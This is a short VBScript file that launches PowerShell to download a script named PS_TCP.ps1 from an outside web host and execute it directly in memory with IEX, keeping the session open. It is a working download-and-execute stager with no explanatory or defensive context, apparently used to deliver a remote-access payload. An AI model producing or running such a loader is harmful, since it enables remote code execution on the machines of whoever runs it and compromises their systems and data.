Option Explicit

Dim objShell

Set objShell = CreateObject("WScript.Shell")

objShell.run "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit IEX ([System.Text.Encoding]::ASCII.GetString((New-Object Net.Webclient).DownloadData('https://insightec.ltd/GEMEL/PS_TCP.ps1')))"

WScript.Quit